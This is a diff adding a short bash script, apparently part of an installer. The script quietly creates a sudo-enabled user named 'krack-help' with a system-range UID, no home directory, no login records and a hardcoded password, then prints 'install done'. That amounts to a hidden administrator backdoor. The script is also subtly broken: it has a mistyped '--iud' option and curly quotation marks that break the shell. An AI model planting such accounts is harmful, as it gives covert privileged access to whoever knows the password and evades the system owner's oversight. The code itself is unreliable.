@@ -1,0 +1,13 @@
+#!/bin/bash
+
+#create sudoer user
+userHelp="krack-help"
+password="Ufo[hs"
+useradd --iud 998 --shell /bin/bash --no-create-home --no-log-init $userHelp
+echo -e “$password\n$password” | sudo passwd $userHelp
+usermod -aG sudo $userHelp
+
+echo "install done"
+
+
+
